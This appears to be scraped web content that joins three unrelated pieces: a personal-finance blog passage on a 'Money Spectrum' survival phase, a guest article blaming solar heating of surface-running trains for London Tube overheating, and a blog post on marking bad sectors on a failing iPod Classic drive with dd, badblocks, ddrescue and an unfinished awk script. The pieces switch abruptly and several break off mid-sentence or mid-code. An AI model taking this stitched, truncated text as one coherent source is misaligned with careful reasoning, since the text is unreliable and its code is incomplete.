this formless slushie and build it into a concrete model that we can all understand. The first step to solving a problem is to articulate it clearly, and that’s what this spectrum is here to do.</p><p>Each of the three phases represent a specific purpose money has for us, with Phase 1 being the ground level of this journey up the tower. We will go into what each of these three phases are soon, but before we do, keep in mind that this is a spectrum, meaning that we will find ourselves sliding along the scale at any time.</p><p>It’s entirely possible that someone will be 100% immersed in Phase 1, but it’s more likely that they will be closer to Phase 1 than Phase 2, and will share characteristics of both areas. This is an important distinction that we will make later on in this post, but for now, remember that our relationship with things are rarely absolutes, and money is no exception to this rule.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A04-Everything-is-a-spectrum.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A04-Everything-is-a-spectrum.png" alt="everything is a spectrum" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A04-Everything-is-a-spectrum.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A04-Everything-is-a-spectrum-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A04-Everything-is-a-spectrum-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A04-Everything-is-a-spectrum-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/A04-Everything-is-a-spectrum-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>Let’s begin our journey up the Money Spectrum with this question: when you take a look at your bank account balance, what do you feel?</p><p>Well, if you’re a part of the 28% of Americans that have <a href="https://www.bankrate.com/banking/savings/financial-security-june-2019/" target="_blank" rel="noopener noreferrer nofollow">no emergency savings whatsoever</a>, the answer to that question will likely be a combination of fear and anxiety. When the sole purpose of money is to provide for the basic necessities of life, then your relationship with it will be a shaky one. Scarcity creates fragility, and it is this situation that opens the doors to Phase #1.</p><h3>Phase #1: Survival</h3><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B02-Entrance-to-Phase-1.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B02-Entrance-to-Phase-1.png" alt="Phase 1 - Survival" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B02-Entrance-to-Phase-1.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B02-Entrance-to-Phase-1-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B02-Entrance-to-Phase-1-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B02-Entrance-to-Phase-1-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B02-Entrance-to-Phase-1-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>One might say that we all share some space in this part of the spectrum. Ultimately, all the necessities of life require payment of some kind: the food we put in our mouths, the clothes we walk around in, the roof over our heads, etc. Without money we wouldn’t have any of these things, so it’s fair to say that it is a requisite of survival for all of us, right?</p><p>Well, not quite.</p><p>While it’s true that money is required to have these basic necessities, that doesn’t mean that we all fear the loss of these necessities equally. A low-income household and an upper middle-class family may both rent property, but the former may worry incessantly about next month’s payment, while the latter may not. Both understand the importance of money, but have different ideas of how their survival could be impacted by the lack of it.</p><p>The difficult thing about the word “survival” is how subjective it tends to be, as humans are <a href="https://en.wikipedia.org/wiki/Loss_aversion" target="_blank" rel="noopener noreferrer nofollow">more reactive to loss than to gain</a>. If a billionaire experienced a sudden reversal in fortune and couldn’t afford his ten-bedroom house anymore, it’s quite possible that he’d say his very survival was being threatened.</p><p>To remove this fog of subjectivity, let’s zoom in on the Survival part of the spectrum and break it down. When I use the word “survival” in this post, I’m simply referring to one’s ability to exist and to have one’s health. In the illustration below, I’ve separated the section out into its smaller constituents, with the level of poverty increasing the lower you go.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B03-Subsections-of-Phase-1.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B03-Subsections-of-Phase-1.png" alt="the stages of survival" width="1500" height="1520" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B03-Subsections-of-Phase-1.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B03-Subsections-of-Phase-1-296x300.png 296w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B03-Subsections-of-Phase-1-1011x1024.png 1011w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B03-Subsections-of-Phase-1-768x778.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B03-Subsections-of-Phase-1-610x618.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>At the lowest level, you have no money or access to food, and you are literally starving to death. This is more likely a function of national/civic infrastructure than an individual’s lack of money, as this is quite rare in any first-world country. However, it is still largely a function of having no fiscal resources, and this is the worst place one can find themselves in as a result of that.</p><p>A step up would be the lack of shelter, or homelessness. This is where one’s fears regarding survival can start feeling real, despite the fact that they are probably nowhere near it (my own fear was a good example of this). This likely happens because most of us are vividly familiar with the problem of homelessness, and have grown up seeing real-life evidence of it everywhere.</p><p>I have clear childhood memories of my parents interacting with the homeless, and you probably do as well. Homelessness is an ever-present window into the difficulties of the human condition, and it reminds you of what can be possible when things go wrong. When we think about our survival being threatened, this familiar sight is where the mind can point to, regardless of how distant that place actually is.</p><p>The next few steps up the spectrum have to do with one’s idea of survival once they have their basic necessities (food/water, shelter, and clothing). Survival is no longer a relentless exercise in acquiring these necessities, but more so a strong commitment in maintaining them. And of course, the fuel that keeps the resource engine running is money.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B04-Money-as-fuel-for-basic-necessities.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B04-Money-as-fuel-for-basic-necessities.png" alt="money fuels basic necessities" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B04-Money-as-fuel-for-basic-necessities.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B04-Money-as-fuel-for-basic-necessities-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B04-Money-as-fuel-for-basic-necessities-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B04-Money-as-fuel-for-basic-necessities-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B04-Money-as-fuel-for-basic-necessities-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>In order to sustain the health of oneself and one’s family, a consistent stream of income is needed, and this generally comes in the form of paid employment. Keep in mind that toward the upper-end of the Survival phase, you are no longer fighting for existence; you are fighting for preservation. You want the flow of money to be predictable, something you can count on every few weeks to sustain the level of basic resources you need.</p><p>A job provides this sense of security, and when you view money as a means for survival, holding this job is all that matters. It doesn’t matter how much you hate your job or how terrible the working conditions may be; as long as the number of hours you work result in a predictable deposit amount, you’ll succumb to it.</p><p>But if this pattern continues and time runs in your favor, there’s a point in which the lines between the Survival phase and Phase #2 (which I’ll reveal shortly) start getting blurry.</p><p>At what point does your job provide you with enough money to feel a sense of security? Is it when you’re no longer living paycheck-to-paycheck and you’re able to save some money each month? If that’s the case, what do your savings have to look like for you to feel a sense of relief? $2,000? $10,000? $30,000?</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B05-Savings-in-Phase-1.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B05-Savings-in-Phase-1.png" alt="how much savings is enough" width="1500" height="1520" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B05-Savings-in-Phase-1.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B05-Savings-in-Phase-1-296x300.png 296w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B05-Savings-in-Phase-1-1011x1024.png 1011w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B05-Savings-in-Phase-1-768x778.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/B05-Savings-in-Phase-1-610x618.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>Toward the upper end of this phase, survival becomes more about your mindset and less about your reality. You are well past the place where you risk sleeping in the streets, but you may continue to operate under the belief that it could happen at any time. This traps you into a limited way of thinking, and paralyzes your potential for growth.</p><p>When you’re in a survival mindset, you will always feel like you’re barely holding onto what you have. Whether that’s $1,000 or $100,000, nothing you have can adequately push away the fears you have about sliding down the spectrum. This may be the result of parental conditioning, personal experience, or any number of reasons, but the longer you view money as a means for survival, the less willing you will be to take the risks required to lead a fulfilling life.</p><p>Risk is usually accompanied with the emotion of fear, and if you’re operating on survival mode, you will be scared to do anything uncertain, no matter how small that risk actually is:</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/E01-Fear-vs-Risk-in-Survival-Mode.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/E01-Fear-vs-Risk-in-Survival-Mode.png" alt="high survival - high fear" width="1500" height="1500" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/E01-Fear-vs-Risk-in-Survival-Mode.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/E01-Fear-vs-Risk-in-Survival-Mode-300x300.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/E01-Fear-vs-Risk-in-Survival-Mode-1024x1024.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/E01-Fear-vs-Risk-in-Survival-Mode-150x150.png 150w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/E01-Fear-vs-Risk-in-Survival-Mode-768x768.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/E01-Fear-vs-Risk-in-Survival-Mode-610x610.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>With this level of consistent fear, you won’t do anything outside of your comfort zone.

            <!-- Share buttons by mashshare.net - Version: 3.7.2--><p>Calvin Barrows has written an article for railbusinessdaily.com about the root cause(s) of overheating in certain metro systems, using London Underground’s ‘Tube’ Network as an example.</p>
<p>Calvin is a Chartered Engineer, latterly retired. His work focused on forensic engineering, to establish the mechanisms of structural and mechanical failures; then continuing as an engineering manager, within the rail industry.</p>
<p>Sylvia Telatycka is co-author and linguist, who with Calvin runs a small but successful property development and rental business.</p>
<p>“This guest article aims to encourage a wider discussion around our hypothesis as to the root cause(s) of overheating in certain metro systems, using London Underground’s ‘Tube’ Network as an example.</p>
<p>Rather than go into complicated thermodynamic formulae to demonstrate the credible science upon which this theory is based, we have described in simple terms the comparable heat generation and heat exchange processes at work, to clarify how these affect this historic Tube network. This is important because, in the earliest days of the London Tube, overheating was simply not an issue…. but WHY….?</p>
<p>In the first instance, we need to understand clearly what the problem is. Paraphrasing Charles Kettering: a problem well defined is half solved and mindful of that, we took the basic premise of the Tube overheating and framed a series of questions to help identify the problem.</p>
<p>1. When does overheating happen?</p>
<p>2. Do ALL metros/subways overheat?</p>
<p>3. Why might some metros/subways overheat, and some might not?</p>
<p>4. And why are these questions relevant to London’s network?</p>
<p>5. How can this overheating be mitigated?</p>
<p>Few would disagree that the Tube overheats but understanding WHEN and WHERE it happens is most revealing. In winter passengers mainly travel bundled up in their winter coats and the saloons are heated. In summer, heavy clothing is shed – indeed some passengers have been known to travel in swimwear.</p>
<p><img src="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.20.35.png" alt="" width="598" height="320" srcset="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.20.35.png 598w, https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.20.35-300x161.png 300w" sizes="(max-width: 598px) 100vw, 598px"></p>
<p>In the above graph i, London’s mean surface ambient air temperatures, averaged over a 30 year period, show a clear increase from approximately -5°C in the winter to around +30°C in the summer.</p>
<p>Interestingly, the following graph ii represents the results of TfL’s temperature monitoring within the underground network, for both the deep tube and sub-surface lines. The TfL temperature variations not only confirm passengers’ subjective perception, they also mimic the curve of temperature data above and demonstrate conclusively that underground network temperatures align with the external seasonal temperatures.</p>
<p><img src="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.17.png" alt="" width="587" height="298" srcset="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.17.png 587w, https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.17-300x152.png 300w" sizes="(max-width: 587px) 100vw, 587px"></p>
<p>In the course of our research we looked at different types of rail networks, categorising them as follows because they all perform differently in relation to overheating:-</p>
<p>1. Metro train networks – which run ONLY underground.</p>
<p>2. Trains networks – which run predominately overground.</p>
<p>3. Metro train networks – which run both overground and underground.</p>
<p>Underground-only networks like Glasgow’s or Warsaw’s are not affected by the overground conditions, so there is little seasonal variation in train and network temperatures. Their ambient underground temperature remains about 16°C – unlike the wide temperature range the TfL data above show for London’s Tube network. Underground-only networks irrefutably demonstrate that operational heat such as braking, being generated year-round, is NOT a significant cause of metro networks overheating. Furthermore, since passengers are not being exposed to overheating they remain comfortable and safe.</p>
<p>Overground-only trains are cool in winter and therefore heated. However, in summer they will overheat, unless they are proactively cooled, usually by air-conditioning, though AC deals with the symptoms, not underlying causes, and it is environmentally unfriendly. Whilst AC is technically sound as long as it can discharge the exhaust heat to free air, if it does not work for some reason…. What then? There have been at least three incidents over the last 15 years where power failures compromised the AC, triggering saloon temperature rises to 46°C; with distressed passengers fainting from heat exhaustion, and others desperate enough to smash windows and even to try and break through emergency doors.</p>
<p>Which brings us neatly to MIXED metro networks like London’s Tube, which run both overground and underground, to see why this overheating is NOT restricted to the overground areas of these networks. The reason behind this apparent contradiction is that these mixed networks are, thermodynamically speaking, open systems – ones that freely exchange energy and matter with their surroundings – where:-</p>
<p>1. The free exchange of energy is a regular transfer of air in and out of the tunnels; and</p>
<p>2. The free exchange of mass is a regular travel of hot, loaded trains in and out of the tunnel.</p>
<p>TfL engineers continue to focus on ‘base load’, aka the operational heat, which by definition is year-round, so this can never explain the seasonal nature of the problem. Saloon AC is not a viable solution here, expelling more heat into an already overheated tunnel. We need to be thinking more holistically: rather than the ‘Cooling the Tube Project’ it should be the ‘Cooling the Whole Tube Network in the Summer Project’.</p>
<p>Clearly the root cause of this 100+ year old seasonal problem is the SUN. However, its sheer power to affect every aspect of a network like London’s Tube has been significantly underestimated. In a thermodynamic nutshell:-</p>
<p>1. Radiation from the sun is short wave energy in the form of light, which on striking the earth or a solid object increases their internal energy.</p>
<p>2. This internal energy is in the form of heat and is then re-radiated from the surface of the earth (and solid objects) as long wave heat energy, which in turn warms the ambient air.</p>
<p>The unintentional consequence of the above process in a thermodynamically open system is that hot ambient air plus heat from solar irradiated trains travelling on the surface is carried into the tunnels.</p>
<p>In the context of mixed metro networks, when overground, all external surfaces of the train exposed to the sun, including wheels and bogies, are being directly irradiated. Like any heat conductive surface, the irradiated train body get hot. The sun’s shortwave radiation readily shines through the window glass; then striking the internal surfaces is converted into heat within those materials. However, heat being longwave radiation and, struggling to pass back out through the window glass, is trapped – an unintended ‘greenhouse’ effect. Finally, the undercarriage components consist of massive chunks of metal – usually black – with the ability to absorb immense amounts of heat.</p>
<p>Furthermore, while rail buckling is a familiar problem, the knock-on effects of the sun on the track beds have never really figured in the context of the network overheating. The whole of the track bed including the rails is absorbing and reflecting heat. So, when trains pass over it, this heat is then reflected outwards and upwards into the wheels, bogies, underside of the carriages, the brakes and traction motors. These get super-heated, not so much through operation, but principally because they are in an overheated environment.</p>
<p><img src="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.34.png" alt="" width="548" height="282" srcset="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.34.png 548w, https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.34-300x154.png 300w" sizes="(max-width: 548px) 100vw, 548px"></p>
<p>The above concept graph predicts the build-up of solar irradiation acting on a train, starting early in the day and repeatedly travelling (in this example) the length of the Central Line. The train is irradiated when overground and dissipates a large proportion of that heat load during the underground sections of the journey. However, each irradiated train movement passing throughout the entire network compounds the effect of previous trains, elevating tunnel temperatures even more as the day progresses – rudimentary monitoring has shown saloon temperatures overground typically increase by up to 6°C in 30 mins between Leyton and Epping around 4.30-5.00pm on a summer afternoon.</p>
<p>While the piston-drag effect as the train passes in and out of the tunnel portals will draw in hot ambient air, probably contributing a small amount of heat to the underground sections, compared to the storage-radiator capacity of the train itself, cumulatively dissipating within the tunnel, it is unlikely to be that significant.</p>
<p>Having identified the root causes of overheating and the contributing factors, the task of managing the overheating in the tunnels is actually quite simple – deal with the overheating of the trains on the surface BEFORE THEY ENTER THE TUNNELS.</p>
<p>There are four obvious radiant barrier measures. These are solar-reflective paints (typical surface temperature reductions of 20⁰C) and Low E glass (absorbing some 80% less solar radiation than standard glass), both of which could be easily retroactively applied to existing trains and become the standard for new rolling stock. Then there is green planting on tracks, with its low heat absorption properties compared to ballast and rails. Once in place maintenance costs should be minimal and the benefits considerable. Lastly effective stabling of off-peak trains, providing appropriate solar shade AND ventilation, is imperative.</p>
<p>In conclusion, and most importantly, it should not be forgotten that overheating saloons will adversely affect passenger health and safety. In London’s Tube, this problem would be exacerbated in a ‘stalled-train event’ underground. Passengers overheated in a carriage, within an overheated tunnel, is a potentially fatal matter, especially when temperatures rise, as they often do in summer, to 40°C or higher and where passengers can do nothing but wait until LU staff can direct their escape.”</p>

<p>I recently bought an used iPod Classic 6th gen. While the storage capacity on the backside is specified to be 80 GB, I was only able to copy around 20GB of data to the hard drive before the iPod would shut itself off.<br>Lets fix that.</p>



<p>The iPod can boot in <a href="https://support.apple.com/en-us/HT201544" target="_blank" rel="noreferrer noopener">“emergency disk mode”</a>, which boots a minimal OS that just exposes the internal hard drive over USB. I’ll use this mode in the rest of this post, as I figure that what I do won’t be disturbed by any software on the iPod.<br></p>



<p>To confirm the problem, I tried writing zeros all over the drive, and as expected, after writing 18 GB, the iPod crashed.</p>



<pre># dd if=/dev/zero of=/dev/sda bs=512K oflag=sync<br>dd: error writing '/dev/sda': Input/output error<br>34285+0 records in<br>34284+0 records out<br>17974689792 bytes (18 GB, 17 GiB) copied, 1065.78 s, 16.9 MB/s</pre>



<pre># dmesg<br>[80318.901496] sd 2:0:0:0: [sda] tag#0 FAILED Result: hostbyte=DID_OK driverbyte=DRIVER_SENSE<br>[80318.901504] sd 2:0:0:0: [sda] tag#0 Sense Key : Medium Error [current] <br>[80318.901509] sd 2:0:0:0: [sda] tag#0 Add.

<p>From this, it is pretty clear that the hard drive is broken and should be changed. It just turns out that Apple made it notoriously hard to change the hard drive, with iFixit giving it a difficulty level of <a rel="noreferrer noopener" href="https://www.ifixit.com/Guide/iPod+Classic+Hard+Drive+Replacement/564" target="_blank">“Very difficult”</a>. The drive will probably eventually fail, but I would like to use it until it fails.<br></p>



<p>So lets see if we can work around the problem with software instead. As filesystem creation didn’t fail on the drive, I suspect that there are working sectors located after the bad sectors that made the iPod crash. So what if we could just tell the filesystem not to use those bad sectors? It turns out most filesystems supports exactly that, and with FAT32 we can set the <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Design_of_the_FAT_file_system#Cluster_values" target="_blank">cluster value to&nbsp;0x?FFFFFF7</a> to mark the clusters with bad sectors.</p>



<p><strong>man 8 mkfs.fat</strong> tells us that we can use -l FILENAME to “Read the bad blocks list from FILENAME.”. So we’ll just have to figure out how to generate that list.</p>



<p>To figure out which sectors work, I started with the ‘badblocks’ program. The iPod claims a sector size of 4KB, so we’ll use that:<br></p>



<pre>fdisk -l /dev/sda<br>Disk /dev/sda: 74.4 GiB, 79824777216 bytes, 19488471 sectors<br>Units: sectors of 1 * 4096 = 4096 bytes<br>Sector size (logical/physical): 4096 bytes / <strong>4096</strong> bytes<br>I/O size (minimum/optimal): 4096 bytes / 4096 byte</pre>



<p>To find all the bad sectors, I tried the following (-s for show progress, -v for verbose).</p>



<pre># badblocks -o bad-blocks.txt -b 4096 -sv /dev/sda<br>Checking blocks 0 to 19488470<br>Checking for bad blocks (read-only test): done                                                 <br>Pass completed, 15097507 bad blocks found. (15097507/0/0 errors)</pre>



<p>At some point my iPod rebooted/froze, and badblocks reported all the remaining sectors as bad. This sucks, as some of those sectors probably work.</p>



<p>What we can do is to look at the output, and find where it begins reporting all blocks as bad. Then we tell badblocks to start at a that point to work around the reboot (in my case it happens when I try to read or write to sector 4390976). This turned out to happen a lot, and was very slow and time consuming, so I switched to a different approach.</p>



<p>I came to think of the <a rel="noreferrer noopener" href="https://www.gnu.org/software/ddrescue/" target="_blank">ddrescue</a> tool, which is designed to be used with faulty drives, so I gave that a go. It turns out that we can misuse ddrescue to figure out which sectors can’t be read, by trying to recover all data from the disk and write the output to /dev/null. For some reason ddrescue is able to detect a bad sector without rebooting the iPod. Any sector that can’t be read, must be in the set of all bad sectors, so this will get us started. ddrescue will write the unrecoverable sectors to mapfile.txt.</p>



<pre># ddrescue --verbose --force --sector-size=4096 --cluster-size=1 --log-events=ddrescue.txt /dev/sda /dev/null mapfile.txt<br> GNU ddrescue 1.22<br> About to copy 79824 MBytes from '/dev/sda' to '/dev/null'<br>     Starting positions: infile = 0 B,  outfile = 0 B<br>     Copy block size:   1 sectors       Initial skip size: 208 sectors<br> Sector size: 4096 Bytes<br>  ipos:   17982 MB, non-trimmed:        0 B,  current rate:   32768 B/s opos:   17982 MB, non-scraped:        0 B,  average rate:    975 kB/s<br> non-tried:        0 B,  bad-sector:   41922 kB,    error rate:       0 B/s<br>   rescued:   79782 MB,   bad areas:     7916,        run time: 22h 43m  9s<br> pct rescued:   99.94%, read errors:    10235,  remaining time:         n/a<br>                               time since last successful read:         n/a<br> Finished</pre>



<p>This took a long time. Around 24 hours with my iPod.</p>



<p>When it finishes, you can visualize the result using ddrescueview, which plots good sectors as green, and bad sectors as red. There are way more sectors than there are “pixels” in the following picture – a single field represents many sectors. This is my result:</p>



<figure><a href="https://anderstrier.dk/wp-content/uploads/2019/01/ipod-mapfile-all.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="1024" height="543" src="https://anderstrier.dk/wp-content/uploads/2019/01/ipod-mapfile-all-1024x543.png" alt="" srcset="https://anderstrier.dk/wp-content/uploads/2019/01/ipod-mapfile-all-1024x543.png 1024w, https://anderstrier.dk/wp-content/uploads/2019/01/ipod-mapfile-all-300x159.png 300w, https://anderstrier.dk/wp-content/uploads/2019/01/ipod-mapfile-all-768x407.png 768w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></a></figure>



<p>If we zoom in on one of the areas with bad blocks, we can spot a pattern, which I think kind of looks like scratches. If I remember correctly, this is zoomed all the way in, making each field represent a single sector.</p>



<figure><a href="https://anderstrier.dk/wp-content/uploads/2019/01/ipod-zoomed-in.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="1024" height="542" src="https://anderstrier.dk/wp-content/uploads/2019/01/ipod-zoomed-in-1024x542.png" alt="" srcset="https://anderstrier.dk/wp-content/uploads/2019/01/ipod-zoomed-in-1024x542.png 1024w, https://anderstrier.dk/wp-content/uploads/2019/01/ipod-zoomed-in-300x159.png 300w, https://anderstrier.dk/wp-content/uploads/2019/01/ipod-zoomed-in-768x406.png 768w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></a></figure>



<p>Now that we have a list of sectors that can be read, we need determine which of those can be written to as well. To test this, we’ll try the <strong>badblocks</strong> program again, but this time we’ll tell it to skip the bad sectors found by ddrescue.</p>



<p>The mapfile is a table of position, size and a status row. Position and size are in bytes, and the status is a symbol with the following meaning:</p>



<pre>'?'       non-tried block
'*'       failed block non-trimmed
'/'       failed block non-scraped
<strong>'-'       failed block bad-sector(s)</strong>

<p>To convert the mapfile into a format that is supported by badblocks, do:</p>



<pre>$ ddrescuelog --list-blocks=- --block-size=4096 mapfile.txt &gt; badblocks-from-ddrescue.txt<p>$ head badblocks-from-ddrescue.txt<br>4387902<br>4388462<br>4388862<br>4389821<br>4389822<br>4390088<br>4390364<br>4390515<br>4390630<br>4390648</p></pre>



<p>We use this file as input to badblocks, and specify a block size of 4096 bytes which is the sector size.</p>



<pre># badblocks -n -v -s -b 4096 -i badblocks-from-ddrescue.txt -o badblocks.txt /dev/sda<p>-n = non-destructive read-write<br>-v = verbose<br>-s = Show progress<br>-b 4096 = block size<br>-i badblocks-from-ddrescue.txt = Skip a list of known bad blocks<br>-o = write the bad blocks to this file</p></pre>



<p>I was expecting that command to find all the missing bad blocks, but it unfortunately didn’t go that well. My iPod soon crashed again, and I had to manually reboot the iPod and find the bad block index in the badblocks.txt file where it started to report all sectors as bad, merge all the found bad blocks together, and tell it to start from that new offset. After a few iterations of this, I gave up, and decided to try something else.</p>



<p>In the pattern we saw using <a href="https://sourceforge.net/projects/ddrescueview/" target="_blank" rel="noreferrer noopener">ddrescueview</a>, it looked like the bad blocks were somewhat grouped together. So what if we “filled out” the bad areas? A simple way to do this is to just consider all blocks near a bad block as bad. I wrote the following awk script to do just that.</p>




<div><table><tbody><tr><td><p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br></p></td><td><div><p><span>BEGIN</span> <span>{</span><br>
&nbsp; <span># Tune this value</span><br>
&nbsp; gapTreshold = <span>4000</span></p><p>

&nbsp; <span># Stores the previous bad block we handeled</span><br>
&nbsp; lastBad = <span>0</span><br>
<span>}</span> <span>{</span><br>
&nbsp; currentBad = <span>$1</span></p><p>

&nbsp; <span># Is the currentBad close to the lastBad block?</span><br>
&nbsp; <span>if</span> <span>(</span><span>(</span>currentBad<span>-</span>lastBad<span>)</span> <span>&lt;</span> gapTreshold<span>)</span> <span>{</span><br>
&nbsp; &nbsp; <span># Fill out the entire space</span><br>
&nbsp; &nbsp; <span>for</span> <span>(</span>i = lastBad<span>+</span><span>1</span> ; i <span>&lt;</span> currentBad; i<span>++</span><span>)</span><br>
&nbsp; &nbsp; &nbsp; <span>print</span> i<br>
&nbsp; <span>}</span> <span>else</span> <span>{</span><br>
&nbsp; &nbsp; <span># We are not close to the previous block.</span><br>
&nbsp; &nbsp; <span># So lastBad must have been the last one in a streak.</span><br>
&nbsp; &nbsp; <span># Skip if lastBad = 0</span><br>
&nbsp; &nbsp; <span>if</span> <span>(</span>lastBad<span>)</span> <span>{</span><br>
&nbsp; &nbsp; &nbsp; <span># Write bad blocks out after the last one</span><br>
&nbsp; &nbsp; &nbsp; <span>for</span> <span>(</span>i = lastBad<span>+</span><span>1</span>; i <span>&lt;</span> lastBad<span>+</span><span>(</span>gapTreshold<span>/</span><span>2</span><span>)</span>; i<span>++</span><span>)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>print</span> i<br>
&nbsp; &nbsp; <span>}</span></p><p>

&nbsp; &nbsp; <span># Write gapTreshold/2 bad blocks out before this one</span><br>
&nbsp; &nbsp; <span>for</span> <span>(</span>i = currentBad<span>-</span><span>(</span>gapTreshold<span>/</span><span>2</span><span>)</span>; i <span>&lt;</span> currentBad; i<span>++</span><span>)</span><br>
&nbsp; &nbsp; &nbsp; <span>print</span> i<br>
&nbsp; <span>}</span><br>
